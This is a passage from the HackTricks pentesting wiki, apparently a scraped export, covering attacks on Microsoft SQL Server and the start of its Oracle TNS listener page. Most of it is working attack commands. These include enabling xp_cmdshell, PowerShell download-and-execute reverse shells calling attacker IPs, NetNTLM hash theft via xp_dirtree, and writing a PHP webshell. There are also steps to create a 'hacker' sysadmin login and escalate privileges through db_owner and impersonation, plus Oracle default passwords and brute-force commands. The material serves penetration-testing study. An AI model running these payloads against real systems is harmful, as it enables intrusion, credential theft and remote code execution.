users\nselect\nsp\n.\nname\nas\nlogin\n,\nsp\n.\ntype_desc\nas\nlogin_type\n,\nsl\n.\npassword_hash\n,\nsp\n.\ncreate_date\n,\nsp\n.\nmodify_date\n,\ncase\nwhen\nsp\n.\nis_disabled\n=\n1\nthen\n'Disabled'\nelse\n'Enabled'\nend\nas\nstatus\nfrom\nsys\n.\nserver_principals sp\nleft\njoin\nsys\n.\nsql_logins sl\non\nsp\n.\nprincipal_id\n=\nsl\n.\nprincipal_id\nwhere\nsp\n.\ntype\nnot\nin\n(\n'G'\n,\n'R'\n)\norder\nby\nsp\n.\nname\n;\n#Create user with sysadmin privs\nCREATE\nLOGIN hacker\nWITH\nPASSWORD\n=\n'P@ssword123!'\nEXEC\nsp_addsrvrolemember\n'hacker'\n,\n'sysadmin'\nGet User\nTypes of MSSQL Users\n# Get all the users and roles\nselect\n*\nfrom\nsys\n.\ndatabase_principals\n;\n## This query filters a bit the results\nselect\nname\n,\ncreate_date\n,\nmodify_date\n,\ntype_desc\nas\ntype\n,\nauthentication_type_desc\nas\nauthentication_type\n,\nsid\nfrom\nsys\n.\ndatabase_principals\nwhere\ntype\nnot\nin\n(\n'A'\n,\n'R'\n)\norder\nby\nname\n;\n‚Äã\n## Both of these select all the users of the current database (not the server).\n## Interesting when you cannot acces the table sys.database_principals\nEXEC\nsp_helpuser\nSELECT\n*\nFROM\nsysusers\nGet Permissions\nSome introduction about some MSSQL terms:\n1.\nSecurable:\nThese are the resources to which the SQL Server Database Engine authorization system controls access. There are three broader categories under which a securable can be differentiated:\nServer ‚Äì For example databases, logins, endpoints, availability groups and server roles\nDatabase ‚Äì For example database role, application roles, schema, certificate, full text catalog, user\nSchema ‚Äì For example table, view, procedure, function, synonym\n2.\nPermission:\nEvery SQL Server securable has associated permissions like ALTER, CONTROL, CREATE that can be granted to a principal. Permissions are managed at the server level using logins and at the database level using users.\n3.\nPrincipal:\nThe entity that receives permission to a securable is called a principal. The most common principals are logins and database users. Access to a securable is controlled by granting or denying permissions or by adding logins and users to roles which have access.\n# Show all different securables names\nSELECT\ndistinct\nclass_desc\nFROM\nsys\n.\nfn_builtin_permissions\n(\nDEFAULT\n);\n# Show all possible permissions in MSSQL\nSELECT\n*\nFROM\nsys\n.\nfn_builtin_permissions\n(\nDEFAULT\n);\n# Get all my permissions over securable type SERVER\nSELECT\n*\nFROM\nfn_my_permissions\n(\nNULL\n,\n'SERVER'\n);\n# Get all my permissions over a database\nUSE\n<\ndatabase\n>\nSELECT\n*\nFROM\nfn_my_permissions\n(\nNULL\n,\n'DATABASE'\n);\n# Get members of the role \"sysadmin\"\nUse\nmaster\nEXEC\nsp_helpsrvrolemember\n'sysadmin'\n;\n# Get if the current user is sysadmin\nSELECT\nIS_SRVROLEMEMBER\n(\n'sysadmin'\n);\n# Get users that can run xp_cmdshell\nUse\nmaster\nEXEC\nsp_helprotect\n'xp_cmdshell'\nTricks\nExecute OS Commands\nNote that in order to be able to execute commands it's not only necessary to have\nxp_cmdshell\nenabled\n, but also have the\nEXECUTE permission on the\nxp_cmdshell\nstored procedure\n. You can get who (except sysadmins) can use\nxp_cmdshell\nwith:\nUse\nmaster\nEXEC\nsp_helprotect\n'xp_cmdshell'\n# Username + Password + CMD command\ncrackmapexec mssql\n-d\n<\nDomain name\n>\n-u\n<\nusername\n>\n-p\n<\npassword\n>\n-x\n\"whoami\"\n# Username + Hash + PS command\ncrackmapexec mssql\n-d\n<\nDomain name\n>\n-u\n<\nusername\n>\n-H\n<\nHASH\n>\n-X\n'$PSVersionTable'\n‚Äã\n# Check if xp_cmdshell is enabled\nSELECT * FROM sys.configurations WHERE name\n=\n'xp_cmdshell'\n;\n‚Äã\n# This turns on advanced options and is needed to configure xp_cmdshell\nsp_configure\n'show advanced options'\n,\n'1'\nRECONFIGURE\n#This enables xp_cmdshell\nsp_configure\n'xp_cmdshell'\n,\n'1'\nRECONFIGURE\n‚Äã\n#One liner\nsp_configure\n'Show Advanced Options'\n,\n1\n;\nRECONFIGURE\n;\nsp_configure\n'xp_cmdshell'\n,\n1\n;\nRECONFIGURE\n;\n‚Äã\n# Quickly check what the service account is via xp_cmdshell\nEXEC master\n..\nxp_cmdshell\n'whoami'\n# Get Rev shell\nEXEC xp_cmdshell\n'echo IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.13:8000/rev.ps1\") | powershell -noprofile'\n‚Äã\n# Bypass blackisted \"EXEC xp_cmdshell\"\n'; DECLARE @x AS VARCHAR(100)='\nxp_cmdshell\n'; EXEC @x '\nping\nk7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' ‚Äî\nSteal NetNTLM hash / Relay attack\nYou should start a\nSMB server\nto capture the hash used in the authentication (\nimpacket-smbserver\nor\nresponder\nfor example).\nxp_dirtree\n'\\\\<attacker_IP>\\any\\thing'\nexec\nmaster.dbo.xp_dirtree\n'\\\\<attacker_IP>\\any\\thing'\nEXEC master\n..\nxp_subdirs\n'\\\\<attacker_IP>\\anything\\'\nEXEC master\n..\nxp_fileexist\n'\\\\<attacker_IP>\\anything\\'\n‚Äã\n# Capture hash\nsudo\nresponder\n-I\ntun0\nsudo\nimpacket-smbserver share ./\n-smb2support\nmsf\n>\nuse auxiliary/admin/mssql/mssql_ntlm_stealer\nYou can check if who (apart sysadmins) has permissions to run those MSSQL functions with:\nUse\nmaster\n;\nEXEC\nsp_helprotect\n'xp_dirtree'\n;\nEXEC\nsp_helprotect\n'xp_subdirs'\n;\nEXEC\nsp_helprotect\n'xp_fileexist'\n;\nUsing tools such as\nresponder\nor\nInveigh\nit's possible to\nsteal the NetNTLM hash\n.\nYou can see how to use these tools in:\nSpoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks\nAbusing MSSQL trusted Links\n‚Äã\nRead this post\nto find more information about how to abuse this feature:\nMSSQL AD Abuse\nWrite Files\nTo write files using\nMSSQL\n, we\nneed to enable\nOle Automation Procedures\n, which requires admin privileges, and then execute some stored procedures to create the file:\n# Enable Ole Automation Procedures\nsp_configure\n'show advanced options'\n,\n1\nRECONFIGURE\n‚Äã\nsp_configure\n'Ole Automation Procedures'\n,\n1\nRECONFIGURE\n‚Äã\n# Create a File\nDECLARE @OLE INT\nDECLARE @FileID INT\nEXECUTE sp_OACreate\n'Scripting.FileSystemObject'\n, @OLE OUT\nEXECUTE sp_OAMethod @OLE,\n'OpenTextFile'\n, @FileID OUT,\n'c:\\inetpub\\wwwroot\\webshell.php'\n,\n8\n,\n1\nEXECUTE sp_OAMethod @FileID,\n'WriteLine'\n, Null,\n'<?php echo shell_exec($_GET[\"c\"]);?>'\nEXECUTE sp_OADestroy @FileID\nEXECUTE sp_OADestroy @OLE\nRead file with\nOPENROWSET\nBy default,\nMSSQL\nallows file\nread on any file in the operating system to which the account has read access\n. We can use the following SQL query:\nSELECT\n*\nFROM\nOPENROWSET\n(\nBULK\nN\n'C:/Windows/System32/drivers/etc/hosts'\n,\nSINGLE_CLOB\n)\nAS\nContents\nHowever, the\nBULK\noption requires the\nADMINISTER BULK OPERATIONS\nor the\nADMINISTER DATABASE BULK OPERATIONS\npermission.\n# Check if you have it\nSELECT\n*\nFROM\nfn_my_permissions\n(\nNULL\n,\n'SERVER'\n)\nWHERE\npermission_name\n=\n'ADMINISTER BULK OPERATIONS'\nOR\npermission_name\n=\n'ADMINISTER DATABASE BULK OPERATIONS'\n;\nError-based vector for SQLi:\nhttps://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\\Windows\\win.ini',SINGLE_CLOB)+R(x))--\nRCE/Read files executing scripts (Python and R)\nMSSQL could allow you to execute\nscripts in Python and/or R\n. These code will be executed by a\ndifferent user\nthan the one using\nxp_cmdshell\nto execute commands.\nExample trying to execute a\n'R'\n\"Hellow World!\"\nnot working\n:\nExample using configured python to perform several actions:\n# Print the user being used (and execute commands)\nEXECUTE\nsp_execute_external_script\n@language\n=\nN\n'Python'\n,\n@script\n=\nN\n'print(__import__(\"getpass\").getuser())'\nEXECUTE\nsp_execute_external_script\n@language\n=\nN\n'Python'\n,\n@script\n=\nN\n'print(__import__(\"os\").system(\"whoami\"))'\n#Open and read a file\nEXECUTE\nsp_execute_external_script\n@language\n=\nN\n'Python'\n,\n@script\n=\nN\n'print(open(\"C:\\\\inetpub\\\\wwwroot\\\\web.config\", \"r\").read())'\n#Multiline\nEXECUTE\nsp_execute_external_script\n@language\n=\nN\n'Python'\n,\n@script\n=\nN\n'\nimport sys\nprint(sys.version)\n'\nGO\nRead Registry\nMicrosoft SQL Server provides\nmultiple extended stored procedures\nthat allow you to interact with not only the network but also the file system and even the\nWindows Registry\n:\nRegular\nInstance-Aware\nsys.xp_regread\nsys.xp_instance_regread\nsys.xp_regenumvalues\nsys.xp_instance_regenumvalues\nsys.xp_regenumkeys\nsys.xp_instance_regenumkeys\nsys.xp_regwrite\nsys.xp_instance_regwrite\nsys.xp_regdeletevalue\nsys.xp_instance_regdeletevalue\nsys.xp_regdeletekey\nsys.xp_instance_regdeletekey\nsys.xp_regaddmultistring\nsys.xp_instance_regaddmultistring\nsys.xp_regremovemultistring\nsys.xp_instance_regremovemultistring\n# Example read registry\nEXECUTE\nmaster\n.\nsys\n.\nxp_regread\n'HKEY_LOCAL_MACHINE'\n,\n'Software\\Microsoft\\Microsoft SQL Server\\MSSQL12.SQL2014\\SQLServerAgent'\n,\n'WorkingDirectory'\n;\n# Example write and then read registry\nEXECUTE\nmaster\n.\nsys\n.\nxp_instance_regwrite\n'HKEY_LOCAL_MACHINE'\n,\n'Software\\Microsoft\\MSSQLSERVER\\SQLServerAgent\\MyNewKey'\n,\n'MyNewValue'\n,\n'REG_SZ'\n,\n'Now you see me!'\n;\nEXECUTE\nmaster\n.\nsys\n.\nxp_instance_regread\n'HKEY_LOCAL_MACHINE'\n,\n'Software\\Microsoft\\MSSQLSERVER\\SQLServerAgent\\MyNewKey'\n,\n'MyNewValue'\n;\n# Example to check who can use these functions\nUse\nmaster\n;\nEXEC\nsp_helprotect\n'xp_regread'\n;\nEXEC\nsp_helprotect\n'xp_regwrite'\n;\nFor\nmore examples\ncheck out the\noriginal source\n.\nRCE with MSSQL User Defined Function - SQLHttp\nIt's possible to\nload a .NET dll within MSSQL with custom functions\n. This, however,\nrequires\ndbo\naccess\nso you need a connection with database\nas\nsa\nor an Administrator role\n.\n‚Äã\nFollowing this link\nto see an example.\nOther ways for RCE\nThere are other methods to get command execution, such as adding\nextended stored procedures\n,\nCLR Assemblies\n,\nSQL Server Agent Jobs\n, and\nexternal scripts\n.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nMSSQL Privilege Escalation\nFrom db_owner to sysadmin\nIf a\nregular user\nis given the role\ndb_owner\nover the\ndatabase owned by an admin\nuser (such as\nsa\n) and that database is configured as\ntrustworthy\n, that user can abuse these privileges to\nprivesc\nbecause\nstored procedures\ncreated in there that can\nexecute\nas the owner (\nadmin\n).\n# Get owners of databases\nSELECT\nsuser_sname\n(\nowner_sid\n)\nFROM\nsys\n.\ndatabases\n‚Äã\n# Find trustworthy databases\nSELECT\na\n.\nname\n,\nb\n.\nis_trustworthy_on\nFROM\nmaster\n..\nsysdatabases\nas\na\nINNER\nJOIN\nsys\n.\ndatabases\nas\nb\nON\na\n.\nname\n=\nb\n.\nname\n;\n‚Äã\n# Get roles over the selected database (look for your username as db_owner)\nUSE\n<\ntrustworthy_db\n>\nSELECT\nrp\n.\nname\nas\ndatabase_role\n,\nmp\n.\nname\nas\ndatabase_user\nfrom\nsys\n.\ndatabase_role_members drm\njoin\nsys\n.\ndatabase_principals rp\non\n(\ndrm\n.\nrole_principal_id\n=\nrp\n.\nprincipal_id\n)\njoin\nsys\n.\ndatabase_principals mp\non\n(\ndrm\n.\nmember_principal_id\n=\nmp\n.\nprincipal_id\n)\n‚Äã\n# If you found you are db_owner of a trustworthy database, you can privesc:\n--1. Create a stored procedure to add your user to sysadmin role\nUSE\n<\ntrustworthy_db\n>\n‚Äã\nCREATE\nPROCEDURE\nsp_elevate_me\nWITH\nEXECUTE\nAS\nOWNER\nAS\nEXEC\nsp_addsrvrolemember\n'USERNAME'\n,\n'sysadmin'\n‚Äã\n--2. Execute stored procedure to get sysadmin role\nUSE\n<\ntrustworthy_db\n>\nEXEC\nsp_elevate_me\n‚Äã\n--3. Verify your user is a sysadmin\nSELECT\nis_srvrolemember\n(\n'sysadmin'\n)\nYou can use a\nmetasploit\nmodule:\nmsf\n>\nuse auxiliary/admin/mssql/mssql_escalate_dbowner\nOr a\nPS\nscript:\n# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1\nImport-Module\n.\nInvoke-SqlServerDbElevateDbOwner\n.\npsm1\nInvoke-SqlServerDbElevateDbOwner\n-\nSqlUser myappuser\n-\nSqlPass MyPassword!\n-\nSqlServerInstance 10\n.\n2\n.\n2\n.\n184\nImpersonation of other users\nSQL Server has a special permission, named\nIMPERSONATE\n, that\nallows the executing user to take on the permissions of another user\nor login until the context is reset or the session ends.\n# Find users you can impersonate\nSELECT\ndistinct\nb\n.\nname\nFROM\nsys\n.\nserver_permissions a\nINNER\nJOIN\nsys\n.\nserver_principals b\nON\na\n.\ngrantor_principal_id\n=\nb\n.\nprincipal_id\nWHERE\na\n.\npermission_name\n=\n'IMPERSONATE'\n# Check if the user \"sa\" or any other high privileged user is mentioned\n‚Äã\n# Impersonate sa user\nEXECUTE\nAS\nLOGIN\n=\n'sa'\nSELECT\nSYSTEM_USER\nSELECT\nIS_SRVROLEMEMBER\n(\n'sysadmin'\n)\nIf you can impersonate a user, even if he isn't sysadmin, you should check i\nf the user has access\nto other\ndatabases\nor linked servers.\nNote that once you are sysadmin you can impersonate any other one:\n-- Impersonate RegUser\nEXECUTE\nAS\nLOGIN\n=\n'RegUser'\n-- Verify you are now running as the the MyUser4 login\nSELECT\nSYSTEM_USER\nSELECT\nIS_SRVROLEMEMBER\n(\n'sysadmin'\n)\n-- Change back to sa\nREVERT\nYou can perform this attack with a\nmetasploit\nmodule:\nmsf\n>\nauxiliary/admin/mssql/mssql_escalate_execute_as\nor with a\nPS\nscript:\n# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1\nImport-Module\n.\nInvoke-SqlServer\n-\nEscalate-ExecuteAs\n.\npsm1\nInvoke-SqlServer\n-\nEscalate-ExecuteAs\n-\nSqlServerInstance 10\n.\n2\n.\n9\n.\n101\n-\nSqlUser myuser1\n-\nSqlPass MyPassword!\nUsing MSSQL for Persistence\n‚Äã\nhttps://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/\n‚Äã\nExtracting passwords from SQL Server Linked Servers\nAn attacker can extract SQL Server Linked Servers passwords from the SQL Instances and get them in clear text, granting the attacker passwords that can be used to acquire a greater foothold on the target. The script to extract and decrypt the passwords stored for the Linked Servers can be found\nhere\n‚Äã\nSome requirements, and configurations must be done in order for this exploit to work. First of all, you must have Administrator rights on the machine, or the ability to manage the SQL Server Configurations.\nAfter validating your permissions, you need to configure three things, which are the following:\n1.\nEnable TCP/IP on the SQL Server instances;\n2.\nAdd a Start Up parameter, in this case, a trace flag will be added, which is -T7806.\n3.\nEnable remote admin connection.\nTo automate these configurations,\nthis repository\nhas the needed scripts. Besides having a powershell script for each step of the configuration, the repository also has a full script which combines the configuration scripts and the extraction and decryption of the passwords.\nFor further information, refer to the following links regarding this attack:\nDecrypting MSSQL Database Link Server Passwords\n‚Äã\n‚Äã\nTroubleshooting the SQL Server Dedicated Administrator Connection\n‚Äã\nLocal Privilege Escalation\nThe user running MSSQL server will have enabled the privilege token\nSeImpersonatePrivilege.\nYou probably will be able to\nescalate to Administrator\nfollowing one of these 2 paged:\nRoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato\nJuicyPotato\nShodan\nport:1433 !HTTP\nReferences\n‚Äã\nhttps://stackoverflow.com/questions/18866881/how-to-get-the-list-of-all-database-users\n‚Äã\n‚Äã\nhttps://www.mssqltips.com/sqlservertip/6828/sql-server-login-user-permissions-fn-my-permissions/\n‚Äã\n‚Äã\nhttps://swarm.ptsecurity.com/advanced-mssql-injection-tricks/\n‚Äã\n‚Äã\nhttps://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/\n‚Äã\n‚Äã\nhttps://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation/\n‚Äã\n‚Äã\nhttps://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/\n‚Äã\n‚Äã\nhttps://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/\n‚Äã\n‚Äã\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nHackTricks Automatic Commands\nProtocol_Name: MSSQL    #Protocol Abbreviation if there is one.\nPort_Number:  1433     #Comma separated if there is more than one.\nProtocol_Description: Microsoft SQL Server         #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for MSSQL\nNote: |\nMicrosoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications‚Äîwhich may run either on the same computer or on another computer across a network (including the Internet).\n‚Äã\n#sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G\n‚Äã\n###the goal is to get xp_cmdshell working###\n1. try and see if it works\nxp_cmdshell `whoami`\ngo\n‚Äã\n2. try to turn component back on\nEXEC SP_CONFIGURE 'xp_cmdshell' , 1\nreconfigure\ngo\nxp_cmdshell `whoami`\ngo\n‚Äã\n3. 'advanced' turn it back on\nEXEC SP_CONFIGURE 'show advanced options', 1\nreconfigure\ngo\nEXEC SP_CONFIGURE 'xp_cmdshell' , 1\nreconfigure\ngo\nxp_cmdshell 'whoami'\ngo\n‚Äã\n‚Äã\n‚Äã\n‚Äã\nxp_cmdshell \"powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('http://10.10.14.60:8000/ye443.ps1')\"\n‚Äã\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server\n‚Äã\nEntry_2:\nName: Nmap for SQL\nDescription: Nmap with SQL Scripts\nCommand: nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}\nEntry_3:\nName: MSSQL consolesless mfs enumeration\nDescription: MSSQL enumeration without the need to run msfconsole\nNote: sourced from https://github.com/carlospolop/legion\nCommand: msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use admin/mssql/mssql_enum_domain_accounts; set RHOSTS {IP}; set RPORT <PORT>; run; exit' &&msfconsole -q -x 'use admin/mssql/mssql_enum_sql_logins; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump; set RHOSTS {IP}; set RPORT <PORT>; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump; set RHOSTS {IP}; set RPORT <PORT>; run; exit'\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n1414 - Pentesting IBM MQ\nNext\nTypes of MSSQL Users\nLast modified\n1mo ago"
    },
    {
        "title": "1521,1522-1529 - Pentesting Oracle TNS Listener",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener",
        "text": "1521,1522-1529 - Pentesting Oracle TNS Listener\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nOracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation (from\nhere\n).\nWhen enumerating Oracle the first step is to talk to the TNS-Listener that usually resides on the default port (1521/TCP, -you may also get secondary listeners on 1522‚Äì1529-).\n1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)\n1748/tcp open  oracle-tns    Oracle TNS Listener\nSummary\n1.\nEnumerate version\ninfo (search for\nknown vulns\n)\n2.\nBruteforce TNS listener\ncommunication (not always needed)\n3.\nEnumerate\n/Bruteforce\nSID names\n(like database names)\n4.\nBruteforce credentials\nfor valid SID name discovered\n5.\nTry to\nexecute code\nIn order to user MSF oracle modules you need to install some dependencies:\nInstallation\n‚Äã\nEnumeration\nTools that can be used for this are: nmap, MSF and\ntnscmd10g\n.\nTNS listener version\nnmap\n--script\n\"oracle-tns-version\"\n-p\n1521\n-T4\n-sV\n<\nIP\n>\nmsf\n>\nuse auxiliary/scanner/oracle/tnslsnr_version\n#apt install tnscmd10g\ntnscmd10g version\n-p\n1521\n-h\n<\nIP\n>\nOther useful TNS listener commands:\nCommand\nPurpose\nping\nPing the listener\nversion\nProvide output of the listener version and platform information\nstatus\nReturn the current status and variables used by the listener\nservices\nDump service data\ndebug\nDump debugging information to the listener log\nreload\nReload the listener configuration file\nsave_config\nWrite the listener configuration file to a backup location\nstop\nInvoke listener shutdown\nIf you\nreceive an error\n, could be because\nTNS versions are incompatible\n(Use the\n--10G\nparameter with\ntnscmd10\n) and if the\nerror persist,\nthe listener may be\npassword protected\n(you can see a list were all the\nerrors are detailed here\n) ‚Äî don't worry‚Ä¶ hydra to the rescue**:**\nhydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener\nThe TNS listener could be vulnerable to\nMitM\nattacks.\nCheck here how to check if the server is vulnerable and how to perform the attack (all versions up to version 12c are)\n.\nSID enumeration\nWhat is a SID\nThe SID (Service Identifier) is essentially the database name, depending on the install you may have one or more default SIDs, or even a totally custom dba defined SID.\nIn some old versions (in 9 it works)\nyou could ask for the SID and the database send it to you:\ntnscmd10g status-p\n1521\n-h\n<\nIP\n>\n#The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)\n‚Äã\n#msf1\nmsf\n>\nuse auxiliary/scanner/oracle/sid_enum\nmsf\n>\nset\nrhost\n<\nIP\n>\nmsf\n>\nrun\n#msf2\nmsf\n>\nuse auxiliary/admin/oracle/tnscmd\nmsf\n>\nset\nCMD\n(\nCONNECT_DATA\n=\n(\nCOMMAND\n=\nSTATUS\n))\nmsf\n>\nset\nrhost\n<\nIP\n>\nmsf\n>\nrun\n#The SID are inside: SERVICE=(SERVICE_NAME=<SID_NAME>)\nIf you cant access this way to the SIDs you will need to bruteforce them:\nSID Bruteforce\nI have merged the nmap and MSF sid lists into this one (without duplicates):\nsids-oracle.txt\n5KB\nText\nhydra\n-L\n/usr/share/metasploit-framework/data/wordlists/sid.txt\n-s\n1521\n<\nIP\n>\noracle-sid\npatator oracle_login\nhost\n=<\nIP\n>\nsid\n=\nFILE0\n0\n=\nsids-oracle.txt\n-x\nignore:code\n=\nORA-12505\n./odat.py sidguesser\n-s\n$SERVER\n-d\n$SID\n--sids-file\n=\n./sids.txt\nmsf\n>\nuse auxiliary/admin/oracle/sid_brute\n#This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt\nnmap\n--script\n+oracle-sid-brute\n-p\n1521\n10.11\n.1.202\n#This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids\nIn order to use\noracle_login\nwith\npatator\nyou need to\ninstall\n:\npip3 install cx_Oracle --upgrade\nTargeting Accounts\nGot SID?\nExcellent, now let‚Äôs move to the next task and extract the user account information. From this point, you can connect to the listener and brute-force credentials.\nMetasploit\n**scanner/oracle/oracle_login\nIt has a built-in dictionary for the\nmost popular default values of user account\ninformation presented as login:password. By the way, such default entries represent one of the most popular and serious security problems in Oracle.\nNmap\ncan also help here with the script\noracle-brute\n. Note that this script\nmixes the logins and passwords\n, that is, it tries each login against every password, and it takes quite a while!\nDefault Passwords\nBelow are some of the default passwords associated with Oracle:\nDBSNMP/DBSNMP\n‚Äî‚ÄäIntelligent Agent uses this to talk to the db server (its some work to change it)\nSYS/CHANGE_ON_INSTALL\n‚Äî‚ÄäDefault sysdba account before and including Oracle v9, as of version 10g this has to be different!\nPCMS_SYS/PCMS_SYS\n‚Äî‚ÄäDefault x account\nWMSYS/WMSYS\n‚Äî‚ÄäDefault x account\nOUTLN/OUTLN\n‚Äî‚ÄäDefault x account\nSCOTT/TIGER\n‚Äî‚ÄäDefault x account\nOther\ndefault passwords\ncan be found\nhere\nand\nhere\n.\nThe versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2, and 11.2.0.3 are vulnerable to\noffline brute force\n.\nRead more about this technique here.\n‚Äã\nUser/Pass bruteforce\nDifferent tools offered\ndifferent user/pass lists\nfor oracle:\noscan:\n/usr/share/oscanner/accounts.default\n(169 lines)\nMSF-1:\nfrom\nadmin/oracle/oracle_login __/usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv (598 lines)\nMSF-2:\nfrom scanner/oracle/oracle_login\n/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt\n(568 lines)\nNmap:\n/usr/share/nmap/nselib/data/oracle-default-accounts.lst\n(687 lines)\nI have\nmixed\nall of them and\nremoved duplicates:\nusers-oracle.txt\n9KB\nText\npass-oracle.txt\n9KB\nText\n‚Äã\nBrute Force\n‚Äã\nNow, that you\nknow a valid SID and valid credentials\n. To connect to the database you need the tool:\nsqlplus\nand to install it you need to follow some steps:\n‚Äã\nInstallation\n‚Äã\nTo login using known credentials:\nsqlplus <username>/<password>@<ip_address>/<SID>;\nIf the TNS Listener is on a non-default port (e.g. TCP/1522) :\nsqlplus <username>/<password>@<ip_address>:<port>/<SID>;\nIf an\naccount has system database priviledges (sysdba) or system operator (sysop)\nyou may wish to try the following:\nsqlplus\n<\nusername\n>\n/\n<\npassword\n>\n@\n<\nip_address\n>\n/\n<\nSID\n>\n'as sysdba'\n;\n#Example:\nsqlplus SYSTEM/\n[email¬†protected]\n/ORCL\n'as sysdba'\nAll in One\nAn interesting tool is oscanner\n, which will try to get some valid SID and then it will brute-force for valid credentials and try to extract some information:\n#apt install oscanner\noscanner\n-s\n<\nIP\n>\n-P\n<\nPORT\n>\nAnother tool that will do all of this it\nodat\n:\ngit\nclone https://github.com/quentinhardy/odat.git\ncd\nodat\n./odat.py\n--help\n#It shouldn't be problems in Kali\n./odat.py all\n-s\n<\nIP\n>\n-p\n<\nPORT\n>\n./odat.py all\n-s\n<\nIP\n>\n-p\n<\nPORT\n>\n-d\n<\nSID\n>\n#To bruteforce accounts for that SID\nWith these options (\n-s\nand\n-p\n), ODAT will\nsearch valid SID\n(System ID) in a first step. You can configure some options for configuring methods (i.e. word-list or brute-force attack). By default, ODAT will use a big word list and it will do a small brute-force attack.\nIf ODAT\nfounds at least one SID\n(e.g.\nORCL\n), it will\nsearch valid Oracle accounts\n. It will do that on\neach SID found\n. You can specify some options for credentials (e.g.\n--accounts-file\n,\n--accounts-files\n,\n--login-as-pwd\n).\nFor\neach valid account\n(e.g.\nSYS\n)\non each valid instance\n(SID), ODAT will return\nwhat each Oracle user can do\n(e.g. reverse shell, read files, become 